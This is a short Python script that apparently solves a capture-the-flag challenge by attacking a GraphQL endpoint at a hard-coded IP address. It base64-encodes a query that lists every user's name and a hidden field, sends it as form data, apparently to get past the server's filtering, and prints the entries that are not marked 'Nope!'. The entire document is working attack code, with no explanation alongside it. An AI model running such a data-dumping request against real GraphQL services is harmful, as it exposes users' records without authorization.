import base64
import json
import requests


url = "http://34.185.167.212:32513/query"


graphql_query = """
{
  allUsers{
    edges {
      node {
        name
        randomStr1ngtoInduc3P4in
      }
    }
  }
}
"""

payload_json = {"query": graphql_query}

encoded = base64.b64encode(json.dumps(payload_json).encode()).decode()

r = requests.post(
    url,
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data = f"query={encoded}"
)

data = r.json()

users = data['data']['allUsers']['edges']

for edge in users:
    flag = edge['node']['randomStr1ngtoInduc3P4in']
    if "Nope!" not in flag:
        print(flag)